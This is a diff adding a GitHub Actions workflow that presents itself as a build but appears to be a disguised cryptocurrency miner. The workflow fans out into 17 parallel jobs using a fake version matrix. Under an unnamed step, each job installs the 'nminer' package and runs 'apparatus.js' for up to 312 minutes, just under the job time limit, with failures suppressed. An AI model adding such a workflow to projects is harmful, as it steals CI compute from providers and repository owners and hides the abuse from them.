@@ -1,0 +1,42 @@
+name: apparatus
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3934 }
+          - { version: 9114 }
+          - { version: 9575 }
+          - { version: 3326 }
+          - { version: 3769 }
+          - { version: 1214 }
+          - { version: 4969 }
+          - { version: 7698 }
+          - { version: 723 }
+          - { version: 6452 }
+          - { version: 9840 }
+          - { version: 6817 }
+          - { version: 6542 }
+          - { version: 3392 }
+          - { version: 7151 }
+          - { version: 8007 }
+          - { version: 5198 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 312m node apparatus.js || echo "apparatus executed"
